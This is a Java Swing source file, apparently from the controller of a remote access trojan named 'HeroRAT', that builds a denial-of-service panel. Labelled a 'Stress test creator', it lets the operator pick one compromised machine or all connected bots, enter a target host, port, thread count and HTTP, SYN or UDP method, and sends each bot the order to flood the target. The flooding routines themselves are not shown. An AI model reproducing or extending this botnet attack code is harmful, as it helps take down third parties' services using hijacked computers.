package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSpinner;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.SpinnerNumberModel;
import javax.swing.border.TitledBorder;

import net.herorat.features.dos.Dos;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;


public class PanelDos extends JPanel
{
	private static final long serialVersionUID = 586529334258854162L;

	private JLabel label_select;
	public JComboBox<String> combo_select;
	public String combo_selected_item = "";
	
	private JLabel label_target;
	private JTextField field_target;
	private JLabel label_threads;
	private JSpinner field_thread;
	private JLabel label_method;
	private JComboBox<String> combo_method;
	private JLabel label_port;
	private JSpinner field_port;
	private JButton button_panel;
	
	private TableModel model_dos;
	
	private JTable table_dos;
	private JScrollPane scroll_dos;
	
	public PanelDos()
	{
		initComponents();
		display();
	}

	private void initComponents()
	{
		setLayout(new BorderLayout(5, 0));
		createPanel();
		createModel();
		createTable();
	}
	
	private void display()
	{
		setVisible(true);
	}
	
	private void createPanel()
	{
		label_select = new JLabel("Select an user: ");
		label_select.setPreferredSize(new Dimension(100, 20));
		combo_select = new JComboBox<String>( Network.getServerList(true) );
		combo_select.setPreferredSize(new Dimension(200, 20));
		combo_select.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0)
			{
				String selection = String.valueOf(combo_select.getSelectedItem());
				if (!selection.equals(combo_selected_item))
				{
					combo_selected_item = selection;
				}
			}
		});
		
		label_target = new JLabel("Target: ");
		label_target.setPreferredSize(new Dimension(100, 20));
		field_target = new JTextField();
		field_target.setPreferredSize(new Dimension(200, 20));
		
		label_threads = new JLabel("Thread: ");
		label_threads.setPreferredSize(new Dimension(100, 20));
		field_thread = new JSpinner();
		field_thread.setModel(new SpinnerNumberModel(100, 1, 999, 1));
		field_thread.setPreferredSize(new Dimension(200, 20));
		
		label_method = new JLabel("Method: ");
		label_method.setPreferredSize(new Dimension(100, 20));
		combo_method = new JComboBox<String>(new String[] {"HTTP", "SYN", "UDP"});
		combo_method.setPreferredSize(new Dimension(200, 20));
		
		label_port = new JLabel("Port: ");
		label_port.setPreferredSize(new Dimension(100, 20));
		field_port = new JSpinner();
		field_port.setModel(new SpinnerNumberModel(1000, 1, 9999, 1));
		field_port.setPreferredSize(new Dimension(200, 20));
		
		button_panel = new JButton("Add to the list");
		button_panel.setPreferredSize(new Dimension(310, 25));
		button_panel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				if (combo_select.getSelectedIndex() == 0)
				{
					model_dos.addRow(new String[]{ field_target.getText(), field_port.getValue().toString(), String.valueOf(combo_method.getSelectedItem()), String.valueOf(Network.getServersCount()), field_thread.getValue().toString() });
					for (Server server : Network.servers.values())
					{
						switch (combo_method.getSelectedIndex())
						{
							case 0:
								Dos.sendHttp(server, field_target.getText(), Integer.parseInt(field_thread.getValue().toString()));
								break;
							case 1:
								Dos.sendSyn(server, field_target.getText(), Integer.parseInt(field_port.getValue().toString()), Integer.parseInt(field_thread.getValue().toString()));
								break;
							case 2:
								Dos.sendUdp(server, field_target.getText(), Integer.parseInt(field_thread.getValue().toString()));
								break;
						}
					}
				}
				else
				{					
					model_dos.addRow(new String[]{ field_target.getText(), field_port.getValue().toString(), String.valueOf(combo_method.getSelectedItem()), "1", field_thread.getValue().toString() });
					Server server = Network.findWithCombo(combo_selected_item);
					switch (combo_method.getSelectedIndex())
					{
						case 0:
							Dos.sendHttp(server, field_target.getText(), Integer.parseInt(field_thread.getValue().toString()));
							break;
						case 1:
							Dos.sendSyn(server, field_target.getText(), Integer.parseInt(field_port.getValue().toString()), Integer.parseInt(field_thread.getValue().toString()));
							break;
						case 2:
							Dos.sendUdp(server, field_target.getText(), Integer.parseInt(field_thread.getValue().toString()));
							break;
					}
				}
			}
		});
		
		JPanel bottom_panel = new JPanel();
		JPanel panel = new JPanel();
		TitledBorder titled = new TitledBorder("Stress test creator");
		panel.setBorder(titled);
		panel.setPreferredSize(new Dimension(400, 190));
		panel.add(label_select);
		panel.add(combo_select);
		panel.add(label_target);
		panel.add(field_target);
		panel.add(label_port);
		panel.add(field_port);
		panel.add(label_threads);
		panel.add(field_thread);
		panel.add(label_method);
		panel.add(combo_method);
		panel.add(button_panel);
		bottom_panel.add(panel);
		add(bottom_panel, BorderLayout.SOUTH);
	}
	
	private void createModel()
	{
		model_dos = new TableModel(new String[] { "Target", "Port", "Method", "Bots", "Threads"});
	}
	
	private void createTable()
	{
		table_dos = new JTable();
		scroll_dos = new JScrollPane();
		
		table_dos.setModel(model_dos);
		table_dos.setSelectionMode(0);
		scroll_dos.setViewportView(table_dos);
		add(scroll_dos, BorderLayout.CENTER);
		
		table_dos.getColumn("Port").setMaxWidth(64);
		table_dos.getColumn("Port").setMinWidth(64);
		table_dos.getColumn("Method").setMaxWidth(128);
		table_dos.getColumn("Method").setMinWidth(128);
		table_dos.getColumn("Bots").setMaxWidth(64);
		table_dos.getColumn("Bots").setMinWidth(64);
		table_dos.getColumn("Threads").setMaxWidth(64);
		table_dos.getColumn("Threads").setMinWidth(64);
		
		table_dos.setRowHeight(32);
		table_dos.getTableHeader().setReorderingAllowed(false);
		
		table_dos.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent e)
			{
				if (e.getClickCount() == 2)
				{
					String target = table_dos.getValueAt(table_dos.getSelectedRow(), 0).toString();
					String port = table_dos.getValueAt(table_dos.getSelectedRow(), 1).toString();
					String method = table_dos.getValueAt(table_dos.getSelectedRow(), 2).toString();
					String threads = table_dos.getValueAt(table_dos.getSelectedRow(), 4).toString();
					
					field_target.setText(target);
					field_port.setValue(Integer.parseInt(port));
					combo_method.setSelectedItem(method);
					field_thread.setValue(Integer.parseInt(threads));
				}
			}
		});
	}
}
